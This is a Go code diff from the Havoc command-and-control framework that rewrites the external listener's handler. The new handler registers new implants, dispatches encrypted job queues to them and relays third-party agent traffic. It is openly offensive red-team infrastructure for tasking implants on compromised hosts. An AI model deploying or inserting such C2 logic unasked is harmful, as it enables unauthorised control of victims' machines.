@@ -2,7 +2,16 @@ package handlers
 
 import (
     "Havoc/pkg/colors"
+    "Havoc/pkg/common/packer"
+    "Havoc/pkg/common/parser"
+    "Havoc/pkg/demons"
     "Havoc/pkg/logger"
+    "encoding/base64"
+    "encoding/hex"
+    "fmt"
+    "io/ioutil"
+    "strings"
+
     "github.com/gin-gonic/gin"
 )
 
@@ -16,7 +25,7 @@ func NewExternal(WebSocketEngine any, Config ExternalConfig) *External {
 }
 
 func (e *External) Start() {
-    e.engine.POST("/"+e.Config.Endpoint, e.handleClient)
+    e.engine.POST("/"+e.Config.Endpoint, e.request)
 
     logger.Info("Started \"" + colors.Green(e.Config.Name) + "\" listener: " + colors.BlueUnderline("external://"+e.Config.Endpoint))
 
@@ -25,240 +34,193 @@ func (e *External) Start() {
     e.RoutineFunc.EventBroadcast("", pk)
 }
 
-// TODO: rewrite it.
-func (e *External) handleClient(ctx *gin.Context) {
+// TODO: handle multiple packages in one request. parse them all for each agent / command
+func (e *External) request(ctx *gin.Context) {
     logger.Debug("ExternalC2 [" + e.Config.Name + "] client connected")
-    /*
-       var (
-           Data            []byte
-           Parser          *parser.Parser
-           AgentInstance   *demons.Agent
-           OutputMap       = make(map[string]string)
-           RequestID       int
-           Value           int
-       )
 
-       Data, err := ioutil.ReadAll(ctx.Request.Body)
-       if err != nil {
-           logger.Error("Failed to read message:", err.Error())
-           return
-       }
+    var (
+        AgentInstance  *demons.Agent
+        RequestPasrser *parser.Parser
+    )
 
-       logger.Debug("Data:\n" + hex.Dump(Data))
+    Body, err := ioutil.ReadAll(ctx.Request.Body)
+    if err != nil {
+        logger.Debug("Error while reading request: " + err.Error())
+    }
 
-       Parser = parser.NewParser(Data)
+    logger.Debug("Body: \n" + hex.Dump(Body))
 
-       if Parser.Length() > 4 {
-           _         = Parser.ParseInt32() // Package Size
-           RequestID = Parser.ParseInt32()
+    RequestPasrser = parser.NewParser(Body)
 
-           if e.RoutineFunc.AgentExists(utils.HexIntToBigEndian(RequestID)) {
+    for RequestPasrser.Length() != 0 {
+        var AgentHeader = demons.AgentHeader{}
 
-               AgentInstance = e.RoutineFunc.AgentGetInstance(utils.HexIntToBigEndian(RequestID))
-               AgentInstance.Info.LastCallIn = time.Now().Format("02-01-2006 15:04:05.999")
+        AgentHeader.Data = parser.NewParser(RequestPasrser.ParseBytes())
 
-               OutputMap["Output"] = AgentInstance.Info.LastCallIn
+        AgentHeader.Size = AgentHeader.Data.Length()
+        AgentHeader.MagicValue = AgentHeader.Data.ParseInt32()
+        AgentHeader.AgentID = AgentHeader.Data.ParseInt32()
 
-               e.RoutineFunc.DemonOutput(AgentInstance.NameID, demons.COMMAND_NOJOB, OutputMap)
+        logger.Debug(fmt.Sprintf("Header Size       : %d", AgentHeader.Size))
+        logger.Debug(fmt.Sprintf("Header MagicValue : %x", AgentHeader.MagicValue))
+        logger.Debug(fmt.Sprintf("Header AgentID    : %x", AgentHeader.AgentID))
+        logger.Debug(fmt.Sprintf("Header Data       : \n%v", hex.Dump(AgentHeader.Data.Buffer())))
+        logger.Debug(fmt.Sprintf("Rest Data         : \n%v", hex.Dump(RequestPasrser.Buffer())))
 
-               if Parser.Length() > 0 {
-                   logger.Debug("Received Output")
+        if AgentHeader.Data.Length() > 4 {
 
-                   AgentInstance = e.RoutineFunc.AgentGetInstance(utils.HexIntToBigEndian(RequestID))
+            if AgentHeader.MagicValue == demons.DEMON_MAGIC_VALUE {
 
-                   if AgentInstance != nil {
+                if e.RoutineFunc.AgentExists(AgentHeader.AgentID) {
+                    logger.Debug("Agent does exists. continue...")
+                    var Command int
 
-                       // AgentInstance.Info.LastCallIn = time.Now().Format("02-01-2006 15:04:05.999")
-                       // Let the client know that we got a callback from the implant
-                       // OutputMap["Output"] = AgentInstance.Info.LastCallIn
+                    // get our agent instance based on the agent id
+                    AgentInstance = e.RoutineFunc.AgentGetInstance(AgentHeader.AgentID)
+                    Command = AgentHeader.Data.ParseInt32()
 
-                       // Callback that demon requested. NOJOB is just the alias
-                       // e.RoutineFunc.DemonOutput(AgentInstance.NameID, demons.COMMAND_NOJOB, OutputMap)
+                    logger.Debug(fmt.Sprintf("Command: %d (%x)", Command, Command))
 
-                       if AgentInstance.Info.MagicValue == demons.DEMON_MAGIC_VALUE {
-                           logger.Debug("Is demon")
+                    if Command == demons.COMMAND_GET_JOB {
 
-                           Parser.ParseInt32()
-                           RequestID = Parser.ParseInt32()
-                           Parser.ParseInt32()
+                        AgentInstance.UpdateLastCallback()
 
-                           logger.Debug(fmt.Sprintf("RequestID: %x : %d\n", RequestID, RequestID))
+                        // telling the havoc client to update the last call time
+                        AgentCallback := make(map[string]string)
+                        AgentCallback["Output"] = AgentInstance.Info.LastCallIn
+                        e.RoutineFunc.DemonOutput(AgentInstance.NameID, demons.COMMAND_NOJOB, AgentCallback)
 
-                           AgentInstance.TaskDispatch(RequestID, Parser, e.RoutineFunc)
-                       } else {
-                           AgentInstance.Info.LastCallIn = time.Now().Format("02-01-2006 15:04:05.999")
+                        if len(AgentInstance.JobQueue) > 0 {
+                            var (
+                                JobQueue = AgentInstance.GetQueuedJobs()
+                                Payload  = demons.BuildPayloadMessage(JobQueue, AgentInstance.Encryption.AESKey, AgentInstance.Encryption.AESIv)
+                                Packer   = packer.NewPacker(nil, nil)
+                            )
 
-                           // Let the client know that we got a callback from the implant
-                           OutputMap["Output"] = AgentInstance.Info.LastCallIn
-                           // Callback that demon requested. NOJOB is just the alias
-                           e.RoutineFunc.DemonOutput(AgentInstance.NameID, demons.COMMAND_NOJOB, OutputMap)
+                            Packer.AddInt32(int32(AgentHeader.AgentID))
+                            Packer.AddBytes(Payload)
+                            Payload = Packer.Buffer()
 
-                           e.RoutineFunc.ServiceAgentGet(AgentInstance.Info.MagicValue).SendResponse(AgentInstance.ToMap(), Parser.Buffer())
-                       }
-                   }
+                            BytesWritten, err := ctx.Writer.Write([]byte(base64.StdEncoding.EncodeToString(Payload)))
+                            if err != nil {
+                                logger.Error("Couldn't write to HTTP connection: " + err.Error())
+                            } else {
+                                var ShowBytes = true
 
-                   ctx.AbortWithStatus(200)
+                                for j := range JobQueue {
+                                    if JobQueue[j].Command == demons.COMMAND_PIVOT {
+                                        if len(JobQueue[j].Data) > 1 {
+                                            if JobQueue[j].Data[0] == demons.DEMON_PIVOT_SMB_COMMAND {
+                                                ShowBytes = false
+                                            }
+                                        }
+                                    } else {
+                                        ShowBytes = true
+                                    }
+                                }
 
-               } else {
-                   if len(AgentInstance.JobQueue) > 0 {
-                       logger.Debug("Has something in queue")
-                       var job = AgentInstance.GetQueuedJobs()
+                                if ShowBytes {
+                                    e.RoutineFunc.CallbackSize(AgentInstance, BytesWritten)
+                                }
+                            }
+                        } else {
+                            var (
+                                Packer = packer.NewPacker(nil, nil)
+                                NoJob  = []demons.DemonJob{{
+                                    Command: demons.COMMAND_NOJOB,
+                                    Data:    []interface{}{},
+                                }}
 
-                       if AgentInstance.Info.MagicValue == demons.DEMON_MAGIC_VALUE {
-                           var (
-                               payload = demons.BuildPayloadMessage(job, AgentInstance.Encryption.AESKey, AgentInstance.Encryption.AESIv)
-                               Packer  = packer.NewPacker(nil, nil)
-                           )
+                                Payload = demons.BuildPayloadMessage(NoJob, AgentInstance.Encryption.AESKey, AgentInstance.Encryption.AESIv)
+                            )
 
-                           for i := range job {
-                               logger.Debug(fmt.Sprintf("Task => CommandID:[%d] TaskID:[%x]\n", job[i].Command, job[i].TaskID))
-                           }
+                            Packer.AddInt32(int32(AgentHeader.AgentID))
+                            Packer.AddBytes(Payload)
+                            Payload = Packer.Buffer()
 
-                           logger.Debug(fmt.Sprintf("RequestID: %x : %d\n", RequestID, RequestID))
+                            _, err := ctx.Writer.Write([]byte(base64.StdEncoding.EncodeToString(Payload)))
+                            if err != nil {
+                                logger.Error("Couldn't write to HTTP connection: " + err.Error())
+                                return
+                            }
+                        }
+                    } else {
+                        AgentInstance.TaskDispatch(Command, AgentHeader.Data, e.RoutineFunc)
+                    }
 
-                           Packer.AddInt32(int32(RequestID))
-                           Packer.AddBytes(payload)
-                           payload = Packer.Buffer()
+                } else {
+                    logger.Debug("Agent does not exists. hope this is a register request")
+                    var Command = AgentHeader.Data.ParseInt32()
 
-                           logger.Debug("write message")
-                           BytesWritten, err := ctx.Writer.Write([]byte(base64.StdEncoding.EncodeToString(payload)))
-                           if err != nil {
-                               logger.Error("Couldn't write to HTTP connection: " + err.Error())
-                           } else {
-                               var ShowBytes = true
+                    if Command == demons.DEMON_INIT {
 
-                               for j := range job {
-                                   if job[j].Command == demons.COMMAND_PIVOT {
-                                       if len(job[j].Data) > 1 {
-                                           if job[j].Data[0] == demons.DEMON_PIVOT_SMB_COMMAND {
-                                               ShowBytes = false
-                                           }
-                                       }
-                                   } else {
-                                       ShowBytes = true
-                                   }
-                               }
-                               if ShowBytes {
-                                   e.RoutineFunc.CallbackSize(AgentInstance, BytesWritten)
-                               }
-                           }
-                           ctx.AbortWithStatus(200)
+                        logger.Debug("Is register request. continue...")
 
-                       } else {
-                           var payload []byte
+                        AgentInstance = demons.AgentParseResponse(AgentHeader.AgentID, AgentHeader.Data)
+                        if AgentInstance == nil {
+                            logger.Debug("Exit")
+                            ctx.AbortWithStatus(404)
+                            return
+                        }
 
-                           for _, j := range job {
-                               payload = append(payload, j.Payload...)
-                           }
+                        AgentInstance.Info.ExternalIP = strings.Split(ctx.Request.RemoteAddr, ":")[0]
+                        AgentInstance.Info.MagicValue = AgentHeader.MagicValue
+                        AgentInstance.Info.Listener = e
 
-                           logger.Debug("write message to 3rd party agent")
-                           BytesWritten, err := ctx.Writer.Write(payload)
-                           if err != nil {
-                               logger.Error("Couldn't write to External C2 socket connection: " + err.Error())
-                           }
+                        e.RoutineFunc.AppendDemon(AgentInstance)
 
-                           e.RoutineFunc.CallbackSize(AgentInstance, BytesWritten)
+                        pk := e.RoutineFunc.EventNewDemon(AgentInstance)
+                        e.RoutineFunc.EventAppend(pk)
+                        e.RoutineFunc.EventBroadcast("", pk)
 
-                           ctx.AbortWithStatus(200)
-                       }
+                        /*Packer = packer.NewPacker(AgentInstance.Encryption.AESKey, AgentInstance.Encryption.AESIv)
+                          Packer.AddUInt32(uint32(AgentHeader.AgentID))
 
-                       // DemonIO.COMMAND <- job.Command
-                   } else {
-                       var (
-                           NoJob = []demons.DemonJob{{
-                               Command: demons.COMMAND_NOJOB,
-                               Data: []interface{}{},
-                           }}
-                           payload = demons.BuildPayloadMessage(NoJob, AgentInstance.Encryption.AESKey, AgentInstance.Encryption.AESIv)
-                           Packer  = packer.NewPacker(nil, nil)
-                       )
+                          Response = Packer.Build()
 
-                       logger.Debug(fmt.Sprintf("RequestID: %x", RequestID))
-                       Packer.AddInt(RequestID)
-                       Packer.AddBytes(payload)
-                       payload = Packer.Buffer()
+                          logger.Debug(fmt.Sprintf("%x", Response))*/
 
-                       logger.Debug("payload:\n" + hex.Dump(payload))
+                        _, err = ctx.Writer.Write([]byte{})
+                        if err != nil {
+                            logger.Error(err)
+                            return
+                        }
 
-                       _, err := ctx.Writer.Write([]byte(base64.StdEncoding.EncodeToString(payload)))
-                       if err != nil {
-                           logger.Error("Couldn't write to External C2 socket connection: " + err.Error())
-                       }
+                        logger.Debug("Finished request")
+                    } else {
+                        logger.Debug("Is not register request. bye...")
+                    }
+                }
+            } else {
 
-                       ctx.AbortWithStatus(200)
-                   }
-               }
+                // TODO: handle 3rd party agent.
+                logger.Debug("Is 3rd party agent. I hope...")
 
-           } else {
-               logger.Debug("Receive Response")
+                if e.RoutineFunc.ServiceAgentExits(AgentHeader.MagicValue) {
+                    var AgentData any = nil
 
-               if RequestID == demons.DEMON_INIT {
+                    AgentInstance = e.RoutineFunc.AgentGetInstance(AgentHeader.AgentID)
+                    if AgentInstance != nil {
+                        AgentData = AgentInstance.ToMap()
+                    }
 
-                   // TODO: parse the Agent Header
-                   var Instance = demons.AgentParseResponse(0, Parser)
-                   if Instance != nil {
-                       demons.LogDemonCallback(Instance)
+                    // receive message
+                    Response := e.RoutineFunc.ServiceAgentGet(AgentHeader.MagicValue).SendResponse(AgentData, AgentHeader)
 
-                       DemonId32, err := strconv.ParseUint(Instance.NameID, 16, 32)
-                       if err != nil {
-                           logger.Error("DemonId32: " + err.Error())
-                       }
+                    _, err = ctx.Writer.Write([]byte(base64.StdEncoding.EncodeToString(Response)))
+                    if err != nil {
+                        logger.Error(err)
+                        return
+                    }
 
-                       if e.RoutineFunc.AgentExists(int(DemonId32)) {
-                           logger.Debug("Demon ID already exists")
-                           return
-                       }
+                } else {
+                    logger.Debug("Alright its not a 3rd party agent request. cya...")
+                }
+            }
+        }
+    }
 
-                       Instance.Info.Listener = e
-
-                       e.RoutineFunc.AppendDemon(Instance)
-
-                       pk := e.RoutineFunc.EventNewDemon(Instance)
-                       e.RoutineFunc.EventAppend(pk)
-                       e.RoutineFunc.EventBroadcast("", pk)
-
-                       _, err = ctx.Writer.Write([]byte{})
-                       if err != nil {
-                           logger.Error("Couldn't write to External C2 socket connection: " + err.Error())
-                       }
-
-                       ctx.AbortWithStatus(200)
-                   }
-               } else {
-                   logger.Debug("Looks like output")
-
-                   Value     = RequestID
-                   RequestID = Parser.ParseInt32() // DemonID
-
-                   logger.Debug(fmt.Sprintf("RequestID: %x : %d\n", RequestID, RequestID))
-
-                   if e.RoutineFunc.AgentExists(utils.HexIntToBigEndian(RequestID)) {
-                       AgentInstance = e.RoutineFunc.AgentGetInstance(utils.HexIntToBigEndian(RequestID))
-
-                       if AgentInstance != nil {
-
-                           if AgentInstance.Info.MagicValue == demons.DEMON_MAGIC_VALUE {
-                               logger.Debug("Is demon")
-                               AgentInstance.TaskDispatch(Value, Parser, e.RoutineFunc)
-                           } else {
-                               AgentInstance.Info.LastCallIn = time.Now().Format("02-01-2006 15:04:05.999")
-                               // Let the client know that we got a callback from the implant
-                               OutputMap["Output"] = AgentInstance.Info.LastCallIn
-                               // Callback that demon requested. NOJOB is just the alias
-                               e.RoutineFunc.DemonOutput(AgentInstance.NameID, demons.COMMAND_NOJOB, OutputMap)
-
-                               e.RoutineFunc.ServiceAgentGet(AgentInstance.Info.MagicValue).SendResponse(AgentInstance.ToMap(), RequestID, Parser)
-                           }
-                       }
-
-                       ctx.AbortWithStatus(200)
-                   } else {
-                       logger.Debug("Demon does not exists")
-                   }
-               }
-           }
-       }
-
-       ctx.AbortWithStatus(404)
-    */
+    logger.Debug("Final Exit")
+    ctx.AbortWithStatus(404)
+    return
 }
